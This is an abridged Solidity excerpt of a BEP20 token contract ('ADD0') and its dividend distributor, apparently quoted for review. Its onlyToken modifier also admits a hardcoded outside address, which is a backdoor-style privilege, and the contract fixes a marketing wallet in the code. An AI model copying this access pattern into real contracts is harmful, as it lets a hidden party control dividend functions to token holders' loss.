...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xB43dE690929BE8EC7c9a5D4Aa688E884df9Ab210)); _;
    }
...
contract Add0 is IBEP20 , Auth, BaseToken {
    
    using SafeMath for uint256;

    string public _name = "ADD0";
    string public _symbol = "A0";
    ...
    address public marketingWallet = 0xBB7796b0f9d2243D9153eC83C6CDC26A6A875bd3;
    ...
    constructor(
        ...
        // address addr1,   //reward
        // address addr2,   //marketing wallet
        // uint256 feeSetting1, // rewards,
        // uint256 feeSetting2, // liquidity
        // uint256 feeSetting3 //marketing
        ...
        // rewardsFee = feeSetting1;
        // liquidityFee = feeSetting2;
        // marketingFee = feeSetting3;
